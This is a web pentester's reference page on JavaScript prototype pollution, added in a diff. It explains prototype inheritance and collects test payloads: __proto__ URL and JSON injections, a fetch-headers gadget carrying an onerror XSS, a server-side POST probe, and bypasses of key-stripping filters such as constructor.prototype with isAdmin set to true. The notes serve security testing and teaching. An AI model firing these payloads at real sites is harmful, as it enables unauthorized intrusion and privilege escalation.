@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>offsecnotes | Prototype pollution</title>
+  <link rel="icon" type="image/png" href="/static/favicon.png">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@exampledev/new.css@1.1.2/new.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github.min.css" media="(prefers-color-scheme: light)" data-theme-css="light">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github-dark.min.css" media="(prefers-color-scheme: dark)" data-theme-css="dark">
+  <link rel="stylesheet" href="/static/style.css">
+  <script>
+    // Theme: saved choice (light/dark) or, if none, the system preference.
+    // Runs before the page is drawn, so there's no flash of the wrong theme.
+    function setTheme(theme) {
+      document.documentElement.dataset.theme = theme;
+      document.querySelectorAll("link[data-theme-css]").forEach(function (link) {
+        link.media = link.dataset.themeCss === theme ? "all" : "not all";
+      });
+    }
+    function toggleTheme() {
+      var current = document.documentElement.dataset.theme ||
+        (matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light");
+      var next = current === "dark" ? "light" : "dark";
+      setTheme(next);
+      try { localStorage.setItem("theme", next); } catch (e) {}
+    }
+    try { var saved = localStorage.getItem("theme"); if (saved) setTheme(saved); } catch (e) {}
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/highlight.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/languages/go.min.js"></script>
+  <script>hljs.highlightAll();</script>
+</head>
+<body>
+  <header>
+    <div class="header-top">
+      <h1>offsecnotes</h1>
+      <button class="theme-toggle" onclick="toggleTheme()" aria-label="Toggle light/dark theme" title="Toggle theme"></button>
+    </div>
+    <nav>
+      <a href="/">Home</a> • <a href="/Android/">Android</a> • <a href="/Web/">Web</a> •
+      <a href="/Network/">Network</a> • <a href="/Linux/">Linux</a> •
+      <a href="/Windows/">Windows</a> • <a href="/Misc/">Misc</a>
+    </nav>
+  </header>
+  <h1>Prototype pollution</h1>
+  <span>by frankheat</span>
+  <div class="toc"><ul>
+<li><a href="#prototype-pollution-sources" id="toc-prototype-pollution-sources">Prototype pollution sources</a></li>
+<li><a href="#client-side-prototype-pollution-manual" id="toc-client-side-prototype-pollution-manual">Client-side prototype pollution (manual)</a>
+<ul>
+<li><a href="#finding-sources" id="toc-finding-sources">Finding sources</a></li>
+<li><a href="#finding-gadgets" id="toc-finding-gadgets">Finding gadgets</a></li>
+</ul></li>
+<li><a href="#browser-apis" id="toc-browser-apis">Browser APIs</a></li>
+<li><a href="#client-side-prototype-pollution-with-dom-invader" id="toc-client-side-prototype-pollution-with-dom-invader">Client-side prototype pollution (with DOM Invader)</a></li>
+<li><a href="#server-side-prototype-pollution" id="toc-server-side-prototype-pollution">Server-side prototype pollution</a></li>
+<li><a href="#bypassing-defenses" id="toc-bypassing-defenses">Bypassing defenses</a>
+<ul>
+<li><a href="#via-the-constructor" id="toc-via-the-constructor">Via the constructor</a></li>
+<li><a href="#bypassing-flawed-key-sanitization" id="toc-bypassing-flawed-key-sanitization">Bypassing flawed key sanitization</a></li>
+</ul></li>
+</ul></div>
+  <hr>
+<details>
+<summary>
+Introduction
+</summary>
+<div class="sourceCode" id="cb1"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="kw">var</span> my_object <span class="op">=</span> {<span class="dt">a</span><span class="op">:</span><span class="dv">1</span><span class="op">,</span> <span class="dt">b</span><span class="op">:</span><span class="dv">2</span>}</span></code></pre></div>
+<p>Access the value of “a”</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(my_object<span class="op">.</span><span class="at">a</span>)     <span class="co">// Output: 1 </span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="co">// functionally equivalent to... </span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(my_object[<span class="st">&quot;a&quot;</span>])  <span class="co">// Output: 1</span></span></code></pre></div>
+<p>Add a property</p>
+<pre class="language-javascript"><code class="lang-javascript"><strong>my_object["c"] = 3
+</strong>// or... 
+my_object.c = 3
+</code></pre>
+<p>Every object has a <code>__proto__</code> (or prototype) property too which points to that object’s ‘prototype’, allowing it to inherit properties and methods.</p>
+<p>If we try to access a property that doesn’t exist on <code>my_object</code>, JavaScript will next look to see if it is part of the next Object’s <strong>proto</strong> property</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a>empty_object <span class="op">=</span> {} </span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="bu">Object</span><span class="op">.</span><span class="at">prototype</span><span class="op">.</span><span class="at">x</span> <span class="op">=</span> <span class="st">&#39;test&#39;</span> </span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(empty_object<span class="op">.</span><span class="at">x</span>) <span class="co">// test</span></span></code></pre></div>
+<div class="sourceCode" id="cb4"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="co">// Empty object. </span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a>blank_object <span class="op">=</span> {} </span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="co">// Object with a few properties</span></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>my_object <span class="op">=</span> {<span class="dt">a</span><span class="op">:</span><span class="dv">1</span><span class="op">,</span> <span class="dt">b</span><span class="op">:</span><span class="dv">2</span>} </span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a><span class="co">// Define the &#39;z&#39; property on the &#39;__proto__&#39; object of &#39;my_object&#39;: </span></span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a>my_object[<span class="st">&quot;__proto__&quot;</span>][<span class="st">&quot;z&quot;</span>] <span class="op">=</span> <span class="st">&quot;test&quot;</span> </span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a><span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(my_object<span class="op">.</span><span class="at">z</span>)     <span class="co">// Output: test</span></span>
+<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a><span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(blank_object<span class="op">.</span><span class="at">z</span>)  <span class="co">// Output: test</span></span>
+<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a><span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(<span class="bu">Object</span><span class="op">.</span><span class="at">z</span>)        <span class="co">// Output: test</span></span>
+<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a><span class="co">// Note: here we add a &#39;z&#39; property on the __proto__ object of &#39;my_object&#39;,</span></span>
+<span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a><span class="co">// that in this case is &quot;Object&quot;.</span></span></code></pre></div>
+<div class="sourceCode" id="cb5"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a>s <span class="op">=</span> <span class="st">&quot;test&quot;</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>s<span class="op">.</span><span class="at">__proto__</span>                         <span class="co">// String { .... }</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a><span class="co">// Define the &#39;z&#39; property on the &#39;__proto__&#39; object of &#39;s&#39;: </span></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>s[<span class="st">&quot;__proto__&quot;</span>][<span class="st">&quot;z&quot;</span>] <span class="op">=</span> <span class="st">&quot;bar&quot;</span></span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a><span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(s<span class="op">.</span><span class="at">z</span>)                    <span class="co">// Output: bar</span></span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a><span class="co">// Create another string ...</span></span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a>x <span class="op">=</span> <span class="st">&quot;test&quot;</span></span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a><span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(x<span class="op">.</span><span class="at">z</span>)                    <span class="co">// Output: bar</span></span>
+<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a><span class="co">// Create an object ...</span></span>
+<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a>obj <span class="op">=</span> {}</span>
+<span id="cb5-14"><a href="#cb5-14" aria-hidden="true" tabindex="-1"></a><span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(obj<span class="op">.</span><span class="at">z</span>)                    <span class="co">// Output: undefined</span></span>
+<span id="cb5-15"><a href="#cb5-15" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-16"><a href="#cb5-16" aria-hidden="true" tabindex="-1"></a><span class="co">// Here we add a &#39;z&#39; property on the __proto__ object of &#39;s&#39;,</span></span>
+<span id="cb5-17"><a href="#cb5-17" aria-hidden="true" tabindex="-1"></a><span class="co">// that in this case is &quot;String&quot;. So now all object all objects </span></span>
+<span id="cb5-18"><a href="#cb5-18" aria-hidden="true" tabindex="-1"></a><span class="co">// that inherit &quot;String&quot; object have this property.</span></span></code></pre></div>
+</details>
+<p>More info: <a href="https://www.netspi.com/blog/technical-blog/web-application-pentesting/ultimate-guide-to-prototype-pollution/">https://www.netspi.com/blog/technical-blog/web-application-pentesting/ultimate-guide-to-prototype-pollution/</a></p>
+<hr />
+<h2 id="prototype-pollution-sources">Prototype pollution sources</h2>
+<p>The three most common JavaScript patterns that can lead to prototype pollution are merging, cloning, and value setting operations. Anytime an object is dynamically built from user input, there’s a risk of prototype pollution.</p>
+<hr />
+<h2 id="client-side-prototype-pollution-manual">Client-side prototype pollution (manual)</h2>
+<h3 id="finding-sources">Finding sources</h3>
+<p><strong>In the URL</strong></p>
+<ol type="1">
+<li><p>Using a common XSS source, such as the URL parameters or hash, set a __proto__ payload, like this:</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode md"><code class="sourceCode markdown"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a>https://example.com/?__proto__[polluted]=Polluted </span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a>// or  </span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a>https://example.com/#__proto__[polluted]=Polluted </span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a>// or  </span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a>https://example.com/?__proto__.polluted=Polluted </span></code></pre></div></li>
+<li><p>Check <code>Object.prototype</code> in your browser console to see if the property was successfully added:</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="bu">Object</span><span class="op">.</span><span class="at">prototype</span><span class="op">.</span><span class="at">polluted</span> <span class="co">// &quot;Polluted&quot; = successful pollution // undefined = failed attempt</span></span></code></pre></div></li>
+<li><p>Repeat with different sources</p>
+<p>An important point is that the <code>[]</code> and <code>.</code> notations are not valid JavaScript in this context; they are defined by the developer. So the pattern you should look for in any source is ‘nesting’</p>
+<p>Ridiculous example</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode md"><code class="sourceCode markdown"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a>https://example.com?firstParam=__prototype__&amp;secondParam=polluted&amp;thirdParam=Polluted </span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a>https://example.com?param-&gt;__proto__-&gt;polluted=Polluted </span></code></pre></div></li>
+</ol>
+<hr />
+<p><strong>In JSON</strong></p>
+<p>Test any kind of JSON. E.g. a JWT could be parsed client-side for example, without any kind of validation.</p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode json"><code class="sourceCode json"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span> </span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;alg&quot;</span><span class="fu">:</span> <span class="st">&quot;HS256&quot;</span><span class="fu">,</span> </span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;typ&quot;</span><span class="fu">:</span> <span class="st">&quot;JWT&quot;</span><span class="fu">,</span> </span>
+<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;kid&quot;</span><span class="fu">:</span> <span class="st">&quot;123&quot;</span><span class="fu">,</span> </span>
+<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;__proto__&quot;</span><span class="fu">:</span> <span class="fu">{</span> </span>
+<span id="cb9-6"><a href="#cb9-6" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&quot;polluted&quot;</span><span class="fu">:</span> <span class="st">&quot;Polluted&quot;</span> </span>
+<span id="cb9-7"><a href="#cb9-7" aria-hidden="true" tabindex="-1"></a>  <span class="fu">}</span> </span>
+<span id="cb9-8"><a href="#cb9-8" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span> </span></code></pre></div>
+<h3 id="finding-gadgets">Finding gadgets</h3>
+<p>Being able to affect the global <code>__proto__</code> property is not very useful unless you can use it to affect other parts of the code.</p>
+<blockquote>
+<p><strong>Tip</strong>: Third-party libraries of prototype pollution gadgets <a href="https://github.com/BlackFan/client-side-prototype-pollution">https://github.com/BlackFan/client-side-prototype-pollution</a>.</p>
+</blockquote>
+<hr />
+<h2 id="browser-apis">Browser APIs</h2>
+<p><strong>Fetch</strong></p>
+<div class="sourceCode" id="cb10"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="fu">fetch</span>(<span class="st">&#39;https://website.com/change-email&#39;</span><span class="op">,</span> {</span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a>    <span class="dt">method</span><span class="op">:</span> <span class="st">&#39;POST&#39;</span><span class="op">,</span></span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a>    <span class="dt">body</span><span class="op">:</span> <span class="st">&#39;user=test&amp;email=test%40test.test&#39;</span></span>
+<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a>})</span></code></pre></div>
+<p>Basically, here are defined <code>method</code> and <code>body</code> properties, but there are a number of other possible properties that we’ve left undefined. So, if you find a source, you can pollute <code>Object.prototype</code> with your own <code>headers</code> property.</p>
+<div class="sourceCode" id="cb11"><pre class="sourceCode md"><code class="sourceCode markdown"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a>?__proto__<span class="co">[</span><span class="ot">headers</span><span class="co">][x-username]</span>=&lt;img/src/onerror=alert(1)&gt;</span></code></pre></div>
+<p>More info: <a href="https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis#prototype-pollution-via-fetch">https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis#prototype-pollution-via-fetch</a></p>
+<hr />
+<p><strong>Object.defineProperty()</strong></p>
+<div class="sourceCode" id="cb12"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="bu">Object</span><span class="op">.</span><span class="fu">defineProperty</span>(config<span class="op">,</span> <span class="st">&#39;transport_url&#39;</span><span class="op">,</span> {<span class="dt">configurable</span><span class="op">:</span> <span class="kw">false</span><span class="op">,</span> <span class="dt">writable</span><span class="op">:</span> <span class="kw">false</span>})<span class="op">;</span></span></code></pre></div>
+<p>Same thing. <code>defineProperty</code> accept other “descriptor” a.g. <code>value</code>.</p>
+<div class="sourceCode" id="cb13"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="ss">/</span><span class="sc">?</span><span class="ss">__proto__</span><span class="sc">[value]</span><span class="ss">=foo</span></span></code></pre></div>
+<p><a href="https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis#prototype-pollution-via-object-defineproperty">https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis#prototype-pollution-via-object-defineproperty</a></p>
+<hr />
+<h2 id="client-side-prototype-pollution-with-dom-invader">Client-side prototype pollution (with DOM Invader)</h2>
+<p><strong>Finding sources</strong></p>
+<p><a href="https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution">https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution</a></p>
+<p><strong>Finding gadgets</strong></p>
+<p><a href="https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution#scanning-for-prototype-pollution-gadgets">https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution#scanning-for-prototype-pollution-gadgets</a></p>
+<hr />
+<h2 id="server-side-prototype-pollution">Server-side prototype pollution</h2>
+<p>Javascript in the backend</p>
+<details>
+<summary>
+Introduction
+</summary>
+<p>An easy trap for developers is overlooking that a JavaScript for…in loop iterates over all of an object’s enumerable properties, including inherited ones from the prototype chain.</p>
+<div class="sourceCode" id="cb14"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="co">// Example with &quot;object&quot;</span></span>
+<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> myObject <span class="op">=</span> { <span class="dt">a</span><span class="op">:</span> <span class="dv">1</span><span class="op">,</span> <span class="dt">b</span><span class="op">:</span> <span class="dv">2</span> }<span class="op">;</span></span>
+<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a><span class="co">// pollute the prototype with an arbitrary property</span></span>
+<span id="cb14-5"><a href="#cb14-5" aria-hidden="true" tabindex="-1"></a><span class="bu">Object</span><span class="op">.</span><span class="at">prototype</span><span class="op">.</span><span class="at">foo</span> <span class="op">=</span> <span class="st">&#39;bar&#39;</span><span class="op">;</span></span>
+<span id="cb14-6"><a href="#cb14-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-7"><a href="#cb14-7" aria-hidden="true" tabindex="-1"></a><span class="co">// confirm myObject doesn&#39;t have its own foo property</span></span>
+<span id="cb14-8"><a href="#cb14-8" aria-hidden="true" tabindex="-1"></a>myObject<span class="op">.</span><span class="fu">hasOwnProperty</span>(<span class="st">&#39;foo&#39;</span>)<span class="op">;</span> <span class="co">// false</span></span>
+<span id="cb14-9"><a href="#cb14-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-10"><a href="#cb14-10" aria-hidden="true" tabindex="-1"></a><span class="co">// list names of properties of myObject</span></span>
+<span id="cb14-11"><a href="#cb14-11" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span>(<span class="kw">const</span> propertyKey <span class="kw">in</span> myObject){</span>
+<span id="cb14-12"><a href="#cb14-12" aria-hidden="true" tabindex="-1"></a>    <span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(propertyKey)<span class="op">;</span></span>
+<span id="cb14-13"><a href="#cb14-13" aria-hidden="true" tabindex="-1"></a>}</span>
+<span id="cb14-14"><a href="#cb14-14" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-15"><a href="#cb14-15" aria-hidden="true" tabindex="-1"></a><span class="co">// Output: a, b, foo</span></span></code></pre></div>
+<div class="sourceCode" id="cb15"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="co">// Example with &quot;array&quot;</span></span>
+<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> myArray <span class="op">=</span> [<span class="st">&#39;a&#39;</span><span class="op">,</span><span class="st">&#39;b&#39;</span>]<span class="op">;</span></span>
+<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a><span class="bu">Object</span><span class="op">.</span><span class="at">prototype</span><span class="op">.</span><span class="at">foo</span> <span class="op">=</span> <span class="st">&#39;bar&#39;</span><span class="op">;</span></span>
+<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span>(<span class="kw">const</span> arrayKey <span class="kw">in</span> myArray){</span>
+<span id="cb15-6"><a href="#cb15-6" aria-hidden="true" tabindex="-1"></a>    <span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(arrayKey)<span class="op">;</span></span>
+<span id="cb15-7"><a href="#cb15-7" aria-hidden="true" tabindex="-1"></a>}</span>
+<span id="cb15-8"><a href="#cb15-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-9"><a href="#cb15-9" aria-hidden="true" tabindex="-1"></a><span class="co">// Output: 0, 1, foo</span></span></code></pre></div>
+</details>
+<blockquote>
+<p><strong>Warning</strong>: It’s easy to unintentionally cause a denial-of-service (DoS), making testing in production risky. In addition, once a server-side prototype is polluted, the change persists for the entire lifetime of the Node process, with no way to reset it.</p>
+</blockquote>
+<p><strong>Detection - (polluted property reflection)</strong></p>
+<p>Attempt to pollute the global <code>Object.prototype</code> with an arbitrary property in a <code>POST</code> / <code>PUT</code> request</p>
+<pre class="http"><code>POST /user/update HTTP/1.1
+Host: vulnerable-website.com
+...
+{
+    &quot;user&quot;:&quot;ithomas&quot;,
+    &quot;firstName&quot;:&quot;isaiah&quot;,
+    &quot;lastName&quot;:&quot;thomas&quot;,
+    &quot;__proto__&quot;:{
+        &quot;foo&quot;:&quot;bar&quot;
+    }
+}</code></pre>
+<pre class="http"><code>HTTP/1.1 200 OK
+...
+{
+    &quot;username&quot;:&quot;ithomas&quot;,
+    &quot;firstName&quot;:&quot;isaiah&quot;,
+    &quot;lastName&quot;:&quot;thomas&quot;,
+    &quot;foo&quot;:&quot;bar&quot;
+}</code></pre>
+<p><strong>Detection - (without polluted property reflection [Automatic])</strong></p>
+<p>Server-Side Prototype Pollution Scanner (Burp extension)</p>
+<p>Right click on the request -&gt; Extensions -&gt; Server-Side Prototype Pollution Scanner -&gt; Server-Side Prototype Pollution</p>
+<hr />
+<h2 id="bypassing-defenses">Bypassing defenses</h2>
+<h3 id="via-the-constructor">Via the constructor</h3>
+<p>A common defense is to remove any properties with the key <code>__proto__</code> from user-controlled objects before merging them.</p>
+<p>Use <code>myObject.constructor.prototype</code> that is equivalent to <code>myObject.__proto__</code></p>
+<div class="sourceCode" id="cb18"><pre class="sourceCode md"><code class="sourceCode markdown"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a>vulnerable-website.com/?foo.constructor.prototype=bar</span></code></pre></div>
+<div class="sourceCode" id="cb19"><pre class="sourceCode json"><code class="sourceCode json"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span></span>
+<span id="cb19-2"><a href="#cb19-2" aria-hidden="true" tabindex="-1"></a>   <span class="dt">&quot;constructor&quot;</span><span class="fu">:{</span></span>
+<span id="cb19-3"><a href="#cb19-3" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&quot;prototype&quot;</span><span class="fu">:{</span></span>
+<span id="cb19-4"><a href="#cb19-4" aria-hidden="true" tabindex="-1"></a>         <span class="dt">&quot;isAdmin&quot;</span><span class="fu">:</span><span class="st">&quot;true&quot;</span></span>
+<span id="cb19-5"><a href="#cb19-5" aria-hidden="true" tabindex="-1"></a>      <span class="fu">}</span>       </span>
+<span id="cb19-6"><a href="#cb19-6" aria-hidden="true" tabindex="-1"></a>   <span class="fu">}</span></span>
+<span id="cb19-7"><a href="#cb19-7" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
+<h3 id="bypassing-flawed-key-sanitization">Bypassing flawed key sanitization</h3>
+<p>Read the js code to understand the defenses. E.g. bypass the strips of <code>__proto__</code></p>
+<div class="sourceCode" id="cb20"><pre class="sourceCode md"><code class="sourceCode markdown"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a>vulnerable-website.com/?__pro__proto__to__<span class="co">[</span><span class="ot">foo</span><span class="co">]</span>=bar</span></code></pre></div>
+  <hr>
+  <footer>
+    <p align="center">
+      <a href="https://github.com/frankheat/offsecnotes">Source code</a> •
+      <a href="https://github.com/frankheat">frankheat</a>
+    </p>
+  </footer>
+</body>
+</html>
